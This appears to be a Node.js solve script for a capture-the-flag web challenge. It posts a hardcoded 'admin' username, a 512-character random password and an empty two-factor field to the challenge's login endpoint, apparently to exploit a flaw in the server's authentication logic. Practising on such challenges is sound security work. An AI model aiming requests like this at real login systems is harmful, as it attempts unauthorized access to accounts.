import fetch from 'node-fetch'; // Ensure you have node-fetch installed

// Function to generate random string
const makeid = (length) => {
  let result = "";
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
};

// Function to send POST request
const sendPostRequest = async () => {
  const randomPassword = makeid(512); // Generate the random password

  // Construct the request body
  const requestBody = {
    username: "admin",           // Hardcoded as per the server code
    password: randomPassword,    // Use the generated random password
    twofactor: ""                // Empty string (as no twofactor is defined in the source)
  };

  try {
    const response = await fetch('http://expressit.520566ba.ctfbazaar.com/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(requestBody),
    });

    const data = await response.text();
    console.log('Response:', data);
  } catch (error) {
    console.error('Error sending request:', error);
  }
};

// Call the function to send the POST request
sendPostRequest();